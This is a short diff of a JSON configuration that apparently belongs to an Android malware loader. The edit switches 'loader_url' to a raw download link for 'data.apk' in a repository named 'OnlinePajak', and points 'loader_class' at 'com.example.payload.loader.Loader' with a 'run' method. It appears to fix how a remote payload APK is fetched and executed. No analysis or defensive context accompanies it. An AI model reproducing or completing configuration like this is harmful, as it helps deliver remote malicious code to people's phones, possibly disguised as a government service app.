@@ -1,10 +1,10 @@
 {
    "aline": [
        {
-           "loader_url": "https://github.com/tomi033/OnlinePajak/blob/main/data.apk",
+           "loader_url": "https://raw.githubusercontent.com/tomi033/OnlinePajak/main/data.apk",
            "loader_size": 12769,
            "loader_sha1": "",
-           "loader_class": "com.example.payload.loader",
+           "loader_class": "com.example.payload.loader.Loader",
            "loader_method": "run"
        }
    ]
